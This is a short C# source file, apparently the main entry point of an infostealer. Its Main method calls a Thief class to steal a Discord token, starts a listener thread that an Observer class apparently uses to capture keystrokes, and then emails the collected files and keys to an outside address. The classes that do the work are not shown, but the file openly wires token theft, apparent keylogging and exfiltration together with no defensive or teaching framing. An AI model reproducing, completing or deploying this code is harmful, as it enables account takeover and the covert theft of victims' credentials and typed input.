using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Fin.thief;


namespace Fin
{
    internal class Program
    {
        public static Observer observer;

        public static void Main(string[] args)
        {



       
            Thief thief = new Thief();
            thief.stealDiscordToken();
            Console.WriteLine("tkn stolen");
            Thread t = new  Thread(thief.listen);
            t.Start();
            Console.WriteLine("waiting");
            Thread.Sleep(10000);
            Console.WriteLine("next");
            Sender.email_send(thief.files, Observer.keys);
            Console.WriteLine("done");
        }



    }

}